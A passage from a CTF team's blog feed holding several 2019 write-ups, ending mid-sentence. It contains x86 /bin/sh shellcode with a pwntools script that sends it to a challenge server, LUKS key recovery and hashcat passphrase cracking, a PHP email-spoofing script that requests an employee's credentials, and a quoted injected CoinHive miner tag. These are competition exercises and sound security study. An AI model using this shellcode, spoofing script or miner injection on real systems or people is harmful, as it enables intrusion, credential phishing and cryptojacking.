<strong>0x8048680</strong> which is right before the program does <strong>CALL EAX</strong> and do a step in and lets what what happened to the shell code after running that for loop:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/5m53dsK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/5m53dsK.png" alt=""><br></a></p><p>So to circumvent this what I did is to repeat the first 4 bytes of my shell code which was the code for <strong>xor eax,eax</strong> and <strong>xor edx,edx</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/yZo3OQb.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/yZo3OQb.png" alt=""><br></a></p><p>So we need to add this to our original shell code and we get this <strong>\x31\xC0\x31\xD2\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80</strong> which in assembly is:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/DYWwyyW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/DYWwyyW.png" alt=""><br></a></p><p>So lets check how it looks in gdb with the breakpoint:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/snueZSE.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/snueZSE.png" alt=""><br></a></p><p>Now that everything is fine we are ready to run the script on the server:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'runitplusplus-a36bf652.challenges.bsidessf.net'</span></span><br><span class="line">port = <span class="number">5353</span></span><br><span class="line">local = <span class="keyword">False</span></span><br><span class="line">filename = <span class="string">'runitplusplus'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#d = os.environ</span></span><br><span class="line">    <span class="comment">#d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253'</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> local <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line">SHELLCODE = <span class="string">'\x31\xC0\x31\xD2\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80'</span>[::<span class="number">-1</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="comment">#gdb.attach(r, '''</span></span><br><span class="line"><span class="comment">#    b *0x8048680</span></span><br><span class="line"><span class="comment">#    c</span></span><br><span class="line"><span class="comment">#    ''')</span></span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.sendline(SHELLCODE)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>Now running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python runitplusplus.py </span><br><span class="line">[+] Opening connection to runitplusplus-a36bf652.challenges.bsidessf.net on port 5353: Done</span><br><span class="line">Send me stuff!!</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ cat home/ctf/flag.txt</span><br><span class="line">&#123;ti_nar_uoy&#125;FTC</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">$ </span><br><span class="line">[*] Closed connection to runitplusplus-a36bf652.challenges.bsidessf.net port 5353</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure><p>The flag was <strong>{ti_nar_uoy}FTC</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;runitplusplus 52&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;This is the same as runit, except requir
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x86" scheme="https://teamrocketist.github.io/categories/Pwn/x86/"/>
    
    
      <category term="bsidesSF" scheme="https://teamrocketist.github.io/tags/bsidesSF/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="shellcode" scheme="https://teamrocketist.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] BsidesSF 2019 - goodluks3</title>
    <link href="https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks3/"/>
    <id>https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks3/</id>
    <published>2019-03-05T22:57:04.000Z</published>
    <updated>2019-03-05T23:16:27.394Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>goodluks3</p></blockquote><blockquote><p><strong>Description:</strong><br>Our third suspect was caught with a running machine with the encrypted disk mounted.<br>We captured the whole hard drive and system memory for you. Can you help us?<br>(Please note, this is a rather large file!)<br>   <a href="https://storage.googleapis.com/bsides-sf-ctf-2019-large-artifacts/goodluks3.7z" target="_blank" rel="noopener">https://storage.googleapis.com/bsides-sf-ctf-2019-large-artifacts/goodluks3.7z</a><br>Solved   </p></blockquote><p>After extracting this 7z file we get an image (<strong>goodluks3.img</strong>) and a memory dump (<strong>goodluks3.mem</strong>), eventually I tried to use <strong>volatility</strong> to analyse the memory but It was way too slow and I still needed to find a profile for this specific linux machine which is always a mess. </p><p>Normally when you have a luks encryption disk and a memory dump in this kind of ctf challenges the objective is normally to find the master key within the dump. So I tried to use <strong>aesfindkey</strong> on the memory dump but It didn’t find anything, after this I started to look for a different tool and I found this <a href="https://sourceforge.net/projects/findaes/" target="_blank" rel="noopener">one</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./findaes ../goodluks3.mem</span><br><span class="line">Searching ../goodluks3.mem</span><br><span class="line">Found AES-256 key schedule at offset 0x895dd88: </span><br><span class="line">b0 7a 29 f5 44 15 47 76 57 04 6e ec d3 03 f5 bd af a4 e6 df b2 71 01 ab af 7e 22 e1 23 94 15 f5 </span><br><span class="line">Found AES-256 key schedule at offset 0x895df78: </span><br><span class="line">8e 8c 3a 67 eb 11 54 6c b1 cc 7d 0f cc 85 e8 43 30 7c 16 d4 7f 86 08 a1 0f 59 3d 4c 31 0f c8 6a</span><br></pre></td></tr></table></figure><p>It found two AES-256 keys, It is time to set up our loop device from the luks image, so lets look at the partitions on <strong>parted</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ sudo parted goodluks3.img</span><br><span class="line">GNU Parted 3.2</span><br><span class="line">Using ~/ctf/bctf/forensics/goodluks3/goodluks3.img</span><br><span class="line">Welcome to GNU Parted! Type <span class="string">'help'</span> to view a list of commands.</span><br><span class="line">(parted) U                                                                </span><br><span class="line">Unit?  [compact]? B                                                       </span><br><span class="line">(parted) <span class="built_in">print</span>                                                            </span><br><span class="line">Model:  (file)</span><br><span class="line">Disk ~/ctf/bctf/forensics/goodluks3/goodluks3.img: 4294967296B</span><br><span class="line">Sector size (logical/physical): 512B/512B</span><br><span class="line">Partition Table: msdos</span><br><span class="line">Disk Flags: </span><br><span class="line"></span><br><span class="line">Number  Start        End          Size         Type     File system     Flags</span><br><span class="line"> 1      1048576B     2999975935B  2998927360B  primary  ext4            boot</span><br><span class="line"> 2      2999975936B  4000317439B  1000341504B  primary</span><br><span class="line"> 3      4000317440B  4293918719B  293601280B   primary  linux-swap(v1)</span><br><span class="line"></span><br><span class="line">(parted)</span><br></pre></td></tr></table></figure><p>We want to set a loop device on number <strong>2</strong> which its <strong>offset</strong> starts at <strong>2999975936B</strong> so lets use <strong>losetup</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo losetup --offset 2999975936 /dev/loop0 goodluks3.img</span><br></pre></td></tr></table></figure><p>And now lets convert one of the dumped keys into a file and decode them into ASCII:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo &apos;8e 8c 3a 67 eb 11 54 6c b1 cc 7d 0f cc 85 e8 43 30 7c 16 d4 7f 86 08 a1 0f 59 3d 4c 31 0f c8 6a&apos; | tr -d &apos; &apos; | xxd -r -p &gt; key0</span><br></pre></td></tr></table></figure><p>Lets try to decrypt now:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cryptsetup luksOpen --master-key-file key0 /dev/loop14 decrypted</span><br><span class="line">Cannot <span class="built_in">read</span> 64 bytes from keyfile key0.</span><br></pre></td></tr></table></figure><p>And we got an error ? They expected a 64 byte key which means  the encryption used was <strong>AES-512</strong> and not <strong>AES-256</strong>, after this I remembered that we got two <strong>AES-256</strong> from <strong>findaes</strong>, what if the full keys is the two keys joined? so lets try that:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">'8e 8c 3a 67 eb 11 54 6c b1 cc 7d 0f cc 85 e8 43 30 7c 16 d4 7f 86 08 a1 0f 59 3d 4c 31 0f c8 6a b0 7a 29 f5 44 15 47 76 57 04 6e ec d3 03 f5 bd af a4 e6 df b2 71 01 ab af 7e 22 e1 23 94 15 f5'</span> | tr -d <span class="string">' '</span> | xxd -r -p &gt; key0</span><br><span class="line">$ sudo cryptsetup luksOpen --master-key-file key0 /dev/loop0 decrypted</span><br></pre></td></tr></table></figure><p>And it worked! the command didn’t spit any kind of errors so lets mount it and get the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mount /dev/mapper/decrypted /mnt/</span><br><span class="line">$ ls /mnt/</span><br><span class="line">collected-wallpapers-master/  ctfscoreboard-master/  flag.txt  lost+found/</span><br><span class="line">$ cat /mnt/flag.txt </span><br><span class="line">CTF&#123;lucky_U_k33p_secrets!&#125;</span><br></pre></td></tr></table></figure><p>The flag was <strong>CTF{lucky_U_k33p_secrets!}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;goodluks3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;br&gt;Our third suspect was caught with a running mac
      
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="bsidesSF" scheme="https://teamrocketist.github.io/tags/bsidesSF/"/>
    
      <category term="masterkey" scheme="https://teamrocketist.github.io/tags/masterkey/"/>
    
      <category term="luks" scheme="https://teamrocketist.github.io/tags/luks/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] BsidesSF 2019 - goodluks2</title>
    <link href="https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks2/"/>
    <id>https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks2/</id>
    <published>2019-03-05T02:18:25.000Z</published>
    <updated>2019-03-05T02:24:59.325Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>goodluks2</strong><br><em>100</em></p></blockquote><blockquote><p><strong>Description:</strong><br>Our first insider threat has lead to a second insider. We haven’t found any clues to the passphrase here, but given the<br>vocabulary of the suspect, I don’t think you’ll have a hard time.  </p><p>   <a href="https://storage.googleapis.com/bsides-sf-ctf-2019-large-artifacts/goodluks2.7z" target="_blank" rel="noopener">https://storage.googleapis.com/bsides-sf-ctf-2019-large-artifacts/goodluks2.7z</a></p></blockquote><p>We have disk image and by the name of the challenge and the description we can already guess that it’s encrypted with luks</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file goodluks2.img </span><br><span class="line">goodluks2.img: DOS/MBR boot sector; partition 1 : ID=0x83, start-CHS (0x0,32,33), end-CHS (0x51,85,4), startsector 2048, 67106816 sectors, extended partition table (last)</span><br></pre></td></tr></table></figure><p>We don’t any more files so we need to actually brute force the passphrase, so let’s try using hashcat for this. But First of all we need to set up a loop device of our image, we need to check the partitions with parted and look at the offset:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ sudo parted goodluks2.img </span><br><span class="line">GNU Parted 3.2</span><br><span class="line">(parted) U                                                                </span><br><span class="line">Unit?  [compact]? B                                                       </span><br><span class="line">(parted) <span class="built_in">print</span>                                                            </span><br><span class="line">Model:  (file)</span><br><span class="line">Disk ~/ctf/bsidectf/forensics/goodluks2/goodluks2.img: 34359738368B</span><br><span class="line">Sector size (logical/physical): 512B/512B</span><br><span class="line">Partition Table: msdos</span><br><span class="line">Disk Flags: </span><br><span class="line"></span><br><span class="line">Number  Start     End           Size          Type     File system  Flags</span><br><span class="line"> 1      1048576B  34359738367B  34358689792B  primary</span><br></pre></td></tr></table></figure><p>We want to loop the primary partition so we want to use <strong>losetup</strong> at <strong>1048576</strong> offset:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls /dev/loop*</span><br><span class="line">/dev/loop0  /dev/loop1 /dev/loop2  /dev/loop3  /dev/loop4  /dev/loop5  /dev/loop6  /dev/loop7  /dev/loop-control</span><br><span class="line">$ sudo losetup --offset 1048576 /dev/loop8 goodluks2.img</span><br><span class="line">$ ls /dev/loop*</span><br><span class="line">/dev/loop0  /dev/loop1 /dev/loop2  /dev/loop3  /dev/loop4  /dev/loop5  /dev/loop6  /dev/loop7 /dev/loop8  /dev/loop-control</span><br></pre></td></tr></table></figure><p>Now that we have to extract the <strong>luks header</strong> which will contain the <strong>hash</strong> for us to crack, we can use <strong>dd</strong> but first we need to locate the offset to the header, we can do this with <strong>cryptsetup luksDump</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sudo cryptsetup luksDump /dev/loop8 </span><br><span class="line">LUKS header information <span class="keyword">for</span> /dev/loop8</span><br><span class="line"></span><br><span class="line">Version:       1</span><br><span class="line">Cipher name:   aes</span><br><span class="line">Cipher mode:   cbc-essiv:sha256</span><br><span class="line">Hash spec:     sha1</span><br><span class="line">Payload offset:4096</span><br><span class="line">MK bits:       256</span><br><span class="line">MK digest:     f9 88 ef ee 9e 28 aa 8c 5a 9e ca 1b fa 50 f6 1b be b7 db 85 </span><br><span class="line">MK salt:       5b b3 77 d8 e9 dd 1f ea 61 b1 21 20 53 54 e1 e1 </span><br><span class="line">               b4 fd 11 21 bf 41 67 6f 9d 80 62 f3 b1 2f 6c dd </span><br><span class="line">MK iterations: 132387</span><br><span class="line">UUID:          4e42c516-dc27-402d-872b-a086739d7e2f</span><br><span class="line"></span><br><span class="line">Key Slot 0: ENABLED</span><br><span class="line">Iterations:         10260</span><br><span class="line">Salt:               73 2d 5e e0 7e 99 40 8c ff ca de 32 c4 2d e0 <span class="built_in">cd</span> </span><br><span class="line">                      1b 6d ad b9 39 08 b5 c5 09 04 af 64 28 d5 bd a9 </span><br><span class="line">Key material offset:8</span><br><span class="line">AF stripes:            4000</span><br><span class="line">Key Slot 1: DISABLED</span><br><span class="line">Key Slot 2: DISABLED</span><br><span class="line">Key Slot 3: DISABLED</span><br><span class="line">Key Slot 4: DISABLED</span><br><span class="line">Key Slot 5: DISABLED</span><br><span class="line">Key Slot 6: DISABLED</span><br><span class="line">Key Slot 7: DISABLED</span><br></pre></td></tr></table></figure><p>The payload <strong>offset</strong> is <strong>4096</strong>, now finally we can extract the hash with <strong>dd</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo dd <span class="keyword">if</span>=/dev/loop8 of=LUKS_Header.dd bs=521 count=4096</span><br></pre></td></tr></table></figure><p>Now we just need to crack with <strong>hashcat</strong>, I used the password list named <strong>rockyou.txt</strong> you can find it easily on the internet it took approximately 14 minutes with both <strong>CPU</strong> and <strong>GPU</strong> running:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/IdOFaCM.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IdOFaCM.png" alt=""><br></a></p><p><a data-fancybox="gallery" href="https://i.imgur.com/29cFRe8.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/29cFRe8.png" alt=""><br></a></p><p>After cracking it (<strong>gaffer3</strong>) we just need decrypt and mount the disk to get the flag!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo cryptsetup luksOpen /dev/loop11 bkup</span><br><span class="line">Enter passphrase <span class="keyword">for</span> ~/ctf/bsidectf/forensics/goodluks2/goodluks2.img: gaffer3</span><br><span class="line">$ sudo mount /dev/mapper/bkup /mnt/</span><br><span class="line">$ ls /mnt/</span><br><span class="line">flag.txt  JohnTheRipper.7z  lost+foundrockyou.7z</span><br><span class="line">$ cat /mnt/flag.txt </span><br><span class="line">CTF&#123;lame_users_keys_suck&#125;</span><br></pre></td></tr></table></figure><p>The flag was <strong>CTF{lame_users_keys_suck}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;goodluks2&lt;/strong&gt;&lt;br&gt;&lt;em&gt;100&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;br&gt;Our first insi
      
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="bsidesSF" scheme="https://teamrocketist.github.io/tags/bsidesSF/"/>
    
      <category term="luks" scheme="https://teamrocketist.github.io/tags/luks/"/>
    
      <category term="hashcat" scheme="https://teamrocketist.github.io/tags/hashcat/"/>
    
      <category term="dictionaryAttack" scheme="https://teamrocketist.github.io/tags/dictionaryAttack/"/>
    
  </entry>
  
  <entry>
    <title>[MISC] TAMUctf - Onboarding Checklist</title>
    <link href="https://teamrocketist.github.io/2019/03/04/MISC-TAMUctf-Onboarding-Checklist/"/>
    <id>https://teamrocketist.github.io/2019/03/04/MISC-TAMUctf-Onboarding-Checklist/</id>
    <published>2019-03-04T11:16:45.000Z</published>
    <updated>2019-03-04T11:26:38.922Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Onboarding Checklist</strong><br><em>465</em></p></blockquote><blockquote><p><strong>Description:</strong><br>From: <a href="mailto:importantperson@somebigcorp.com" target="_blank" rel="noopener">importantperson@somebigcorp.com</a><br>Date: Feb 22, 2019 9:00 AM<br>To: <a href="mailto:someguy@somebigcorp.com" target="_blank" rel="noopener">someguy@somebigcorp.com</a><br>Subject: New Employee Access</p><p>Hello Some Guy,<br>We need to begin sending requests for the new employee to get access to our security appliances. I believe they already know that you are authorized to make a new account request. Would you mind sending the new employee’s email address to <a href="mailto:tamuctf@gmail.com" target="_blank" rel="noopener">tamuctf@gmail.com</a> so they can process the account request?<br>Thank you,<br>Important Person</p><p>The new employee can be a little slow to respond.</p><p>Difficulty: easy</p><p>2/26 8:42 am CST: Visting  <code>somebigcorp.com</code>  is not part of the challenge</p></blockquote><p>The goal of this challenge is clear. Send an email to <a href="mailto:tamuctf@gmail.com" target="_blank" rel="noopener">tamuctf@gmail.com</a> requesting the credentials for the new employee. Although … we need to be disguised as <a href="mailto:someguy@somebigcorp.com" target="_blank" rel="noopener">someguy@somebigcorp.com</a> in order to request the credentials. How?</p><p><strong>*Email spoofing</strong> is the forgery of an email header so that the message appears to have originated from someone or somewhere other than the actual source.*</p><p>To use this technique there is a perfect PHP function called mail(). All we need is a PHP server and an email server (check it up how to setup one on google if you don’t know how to do it)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mail ( string  $to , string  $subject , string  $message [, [mixed] $additional_headers [, string  $</span><br><span class="line">    additional_parameters ]] ) : bool</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>The most important parameters in this case are: <em>From</em> and <em>Reply-To</em> in the additional headers section.  In the <em>From</em> argument we put the email we want to spoof and in the <em>Reply-To</em> we chose the email where we want the people that we fooled to send the replies, in this case we want to fool <a href="mailto:tamuctf@gmail.com" target="_blank" rel="noopener">tamuctf@gmail.com</a>. </p><p>So to retrieve the flag all we need is:</p><ul><li>PHP Server</li><li>Email Server</li><li>An email where we can receive the credentials (let’s call it <a href="mailto:examplemail@10minutemail.com" target="_blank" rel="noopener">examplemail@10minutemail.com</a>)</li><li>Call the PHP mail() function from the server.</li><li>Put the email where we want to receive the info into the body of the mail()’s message</li></ul><p>Let’s create the file <em>imnotspoofing.php</em> with the following content<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$to= <span class="string">'tamuctf@gmail.com'</span>;</span><br><span class="line">$subject = <span class="string">'Requesting new employee credentials'</span>;</span><br><span class="line">$message= <span class="string">'Hello. I am request the new employee credentials. Can you send them to my email examplemail@10minutemail.com. Thanks'</span></span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'From: someguy@somebigcorp.com'</span>,</span><br><span class="line">            <span class="string">'Reply-To:  examplemail@10minutemail.com'</span>,</span><br><span class="line">            <span class="string">'X_Mailer: PHP/'</span> . phpversion()</span><br><span class="line">            );</span><br><span class="line">mail($to, $subject, $message, implode(<span class="string">"\n"</span>, $headers));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>Shortly after we running this PHP snippet from our server, we’ll receive an email in our <a href="mailto:examplemail@10minutemail.com" target="_blank" rel="noopener">examplemail@10minutemail.com</a> with the flag:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/TDBkzNW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/TDBkzNW.png] &quot;flag&quot; =720x" alt="alt text"><br></a><br> <strong>FLAG:</strong> gigem{wuT_4n_31337_sp0ofer_494C4F5645594F55}</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Onboarding Checklist&lt;/strong&gt;&lt;br&gt;&lt;em&gt;465&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;br&gt;Fro
      
    
    </summary>
    
      <category term="Misc" scheme="https://teamrocketist.github.io/categories/Misc/"/>
    
    
      <category term="mailSpoofing" scheme="https://teamrocketist.github.io/tags/mailSpoofing/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] TAMUctf - DriveByInc</title>
    <link href="https://teamrocketist.github.io/2019/03/03/Forensics-TAMUctf-DriveByInc/"/>
    <id>https://teamrocketist.github.io/2019/03/03/Forensics-TAMUctf-DriveByInc/</id>
    <published>2019-03-03T22:04:16.000Z</published>
    <updated>2019-03-04T02:35:18.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0-intrusion"><a href="#0-intrusion" class="headerlink" title="0_intrusion"></a>0_intrusion</h1><blockquote><br>0_intrusion<br>100<br><br>Welcome to Drive By Inc. We provide all sorts of logistical solutions for our customers.<br>Over the past few years we moved to hosting a large portion of our business on a nice looking website.<br>Recently our customers are complaining that the front page of our website is causing their computers to run extremely slowly.<br>We hope that it is just because we added too much javascript but can you take a look for us just to make sure?<br><br>1.    What is the full malicious line? (Including any HTML tags)<br><br><br></blockquote><p>For the first part we needed to find the malicious line on this html file, after analysing it we found a malicious line using a known javascript miner api we could also note that the API was being loaded from an external server which the ip is 10.187.195.95.</p><p>The answer was:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span> = <span class="string">http://10.187.195.95/js/colorbox.min.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">var</span> color = <span class="keyword">new</span> CoinHive.Anonymous(<span class="string">"123456-asdfgh"</span>);color.start()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="1-logs"><a href="#1-logs" class="headerlink" title="1_logs"></a>1_logs</h1><blockquote><br>1_logs<br>100<br><br>Strange.<br>We don’t know how that got there.<br>We have since gone and removed the offending lines.<br>Maybe one of our developers wanted to make some money on the side.<br>Here is a pcap and some web server logs from the day that users started complaining.<br>Can you figure out if something nefarious happened while we go talk to the devs?<br><br>Link to pcap<br><br>What is the ip of the attacker?<br>What ports did they find open? (List low to high ex: 1,2,3)<br>What are the names of the web files they found on the server? (List in alphabetical order comma separated ex: a.html,a.php,b.html)<br><br>2/23 1:08 am CST add forgotten log files 2/23 8:29 am CST add slight clarification to 2<br><br></blockquote><h3 id="What-is-the-ip-of-the-attacker"><a href="#What-is-the-ip-of-the-attacker" class="headerlink" title="What is the ip of the attacker?"></a>What is the ip of the attacker?</h3><p>Now that we have a network capture we can start analysing the network, so for the first question we remembered that there was a JavaScript file being loaded from an ip <strong>10.187.195.95</strong> from the previous part, so we tried to answer that and we got the 1st question, that was indeed the ip from the attacker. </p><h3 id="What-ports-did-they-find-open-List-low-to-high-ex-1-2-3"><a href="#What-ports-did-they-find-open-List-low-to-high-ex-1-2-3" class="headerlink" title="What ports did they find open? (List low to high ex: 1,2,3)"></a>What ports did they find open? (List low to high ex: 1,2,3)</h3><p>After this we started to analyse the pcap with this filter <strong>ip.src == 10.187.195.95 || ip.dst == 10.187.195.95</strong> with this we removed all the irrelevant packets for the problem. By reading the question we can already know the attacker did a port scan on the server probably used <strong>nmap</strong> or something so to apply the right filters on tshark and extract <strong>the ports</strong> we need to know how a port scan works in 